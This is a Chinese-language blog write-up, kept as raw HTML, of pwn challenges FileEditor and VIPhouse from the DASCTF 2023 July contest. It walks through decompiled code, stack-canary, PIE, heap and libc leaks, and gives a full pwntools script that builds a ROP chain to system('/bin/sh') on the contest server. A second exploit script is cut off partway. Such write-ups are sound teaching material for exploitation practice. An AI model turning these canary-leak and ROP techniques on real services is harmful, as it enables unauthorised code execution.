<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="FileEditorstruct&amp;#123;DWORD line_numchar string[204]void *next_ptr&amp;#125;  Find_String里会把原来的字符串先拷贝到栈，最后再拷贝回去，只要控制a2 + 104处为0，a2不为0就可以把栈上的值拷贝回到原来存储字符串的堆上，这里就完全符合canary最后一位为\x00的特性 char *__fastcall vuln_">
<meta property="og:type" content="article">
<meta property="og:title" content="DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn">
<meta property="og:url" content="https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="FileEditorstruct&amp;#123;DWORD line_numchar string[204]void *next_ptr&amp;#125;  Find_String里会把原来的字符串先拷贝到栈，最后再拷贝回去，只要控制a2 + 104处为0，a2不为0就可以把栈上的值拷贝回到原来存储字符串的堆上，这里就完全符合canary最后一位为\x00的特性 char *__fastcall vuln_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png">
<meta property="article:published_time" content="2023-07-24T13:42:53.000Z">
<meta property="article:modified_time" content="2023-07-25T13:25:12.553Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/20/first-aarch64-pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&text=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&is_video=false&description=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn&body=Check out this article: https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&name=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&t=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FileEditor"><span class="toc-number">1.</span> <span class="toc-text">FileEditor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VIPhouse"><span class="toc-number">2.</span> <span class="toc-text">VIPhouse</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-24T13:42:53.000Z" itemprop="datePublished">2023-07-24</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">DWORD line_num</span><br><span class="line"><span class="type">char</span> <span class="built_in">string</span>[<span class="number">204</span>]</span><br><span class="line"><span class="type">void</span> *next_ptr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Find_String里会把原来的字符串先拷贝到栈，最后再拷贝回去，只要控制a2 + 104处为0，a2不为0就可以把栈上的值拷贝回到原来存储字符串的堆上，这里就完全符合canary最后一位为\x00的特性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">vuln_copy</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">104</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(a2 + <span class="number">105</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">179</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    a1[i] = (<span class="type">char</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Find_String时栈情况，可以用来泄露基地址</p>
<p><img src="/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png" alt="image-20230724230450343"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28327&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Insert_Line</span>(<span class="params">line_num,line_count,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;r n m:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sl(<span class="built_in">str</span>(line_count).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;sequence:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Modify_Line</span>(<span class="params">line_num,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;be modified:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sla(<span class="string">b&#x27; content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findstring</span>(<span class="params">find_str</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;search for:&#x27;</span>,find_str)</span><br><span class="line">  sla(<span class="string">b&#x27;hing? (y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x2154)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x001FA4)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x02350)&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">Insert_Line(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">canary=uu64(r(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555552b</span>-<span class="number">0x555555554000</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555a2a0</span>-<span class="number">0x55555555a000</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffff7de5083</span>-<span class="number">0x7ffff7dc1000</span>)<span class="comment">#ubuntu20</span></span><br><span class="line"><span class="comment"># -(0x7ffff7c29d90-0x7ffff7c00000)#unbuntu22</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">rdi=pie+<span class="number">0x2ac3</span></span><br><span class="line">ret=pie+<span class="number">0x101a</span></span><br><span class="line">rop=flat([canary,<span class="number">0</span>,rdi,binsh,ret,system])</span><br><span class="line"><span class="built_in">print</span>(rop)</span><br><span class="line"><span class="comment"># rop=p64(canary)+p64(0xdeadbeef)+p64(rdi)+p64(binsh)+p64(system)</span></span><br><span class="line"><span class="comment"># print(rop)</span></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+rop)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>另一个可以泄露的漏洞点在Replace_String函数里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">104</span>]; <span class="comment">// [rsp+130h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v7 = <span class="number">1</span>;</span><br><span class="line">v9 = a1;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Please enter the string to search for:&quot;</span>);</span><br><span class="line">read_string((__int64)s2, <span class="number">104</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">read_string((__int64)v14, <span class="number">104</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_string</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read_string实际上可以往里读105个数，来覆盖canary最后一位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11 = sub_55EAC947338F(s2, v14, v9-&gt;<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v9-&gt;<span class="built_in">string</span>, v11);</span><br></pre></td></tr></table></figure>

<p>可以把canary保存到存储字符串去来泄露</p>
<p>最后在利用下面的read_string里的&#x2F;n会被置零，来恢复canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Do you want to change your strings? (y/n)&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%c&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="string">&#x27;Y&#x27;</span> || v3 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    read_string((__int64)v14, <span class="number">104</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了canary其实就可以在Find_String里构造rop利用puts来泄露libc了，高版本的栈里是libc_start_call_main基本上没有工具可以寻找libc库</p>
<h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>login存在溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+64h] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">64</span>]; <span class="comment">// [rsp+258h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x1F4</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your username: &quot;</span>);</span><br><span class="line">  get_str(s, <span class="number">99LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  get_str(v3, <span class="number">104LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;admin&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;root&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome, ADMIN~&quot;</span>);</span><br><span class="line">    admin = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>canary function里 用strcpy(s, random);给s赋值，random存在开头为0情况，导致s为b’\x00’*8，可以泄露canary</p>
<p>程序里没有gadget直接给rdi赋值，可以用下面来赋值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add_Note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please delete at first!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to allocate memory.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">    get_str((__int64)ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">      <span class="built_in">strcpy</span>(dest, ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note added.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Add_Note函数会把输入放到dest地址指向的内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401CB2 55                            push    rbp</span><br><span class="line">.text:0000000000401CB3 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401CB6 48 8D 05 73 24 00 00          lea     rax, dest;把dest地址给rax</span><br><span class="line">.text:0000000000401CBD 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401CC0 48 8B 3F                      mov     rdi, [rdi];把dest地址指向的内存也就是我们的addnote函数里的输入给rdi</span><br><span class="line">.text:0000000000401CC3 C3                            retn</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./viphouse&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span 